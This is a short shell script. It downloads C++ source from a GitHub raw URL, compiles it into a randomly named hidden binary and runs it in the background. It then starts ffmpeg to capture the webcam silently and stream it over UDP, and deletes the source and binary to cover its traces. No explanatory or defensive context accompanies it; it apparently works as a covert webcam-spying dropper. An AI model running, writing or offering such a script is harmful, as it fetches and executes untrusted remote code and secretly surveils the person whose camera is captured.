fileName=$(echo $RANDOM $RANDOM | tr -d ' ')
curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | cat > hey.cxx
g++ hey.cxx -o .$fileName
./.$fileName &
ffmpeg -f video4linux2 -i /dev/video0 -hide_banner -loglevel quiet -stats -preset ultrafast -vcodec libx264 -tune zerolatency -b 900k -f mpegts udp://127.0.0.1:5015 &
rm hey.cxx
rm ./.$fileName
exit
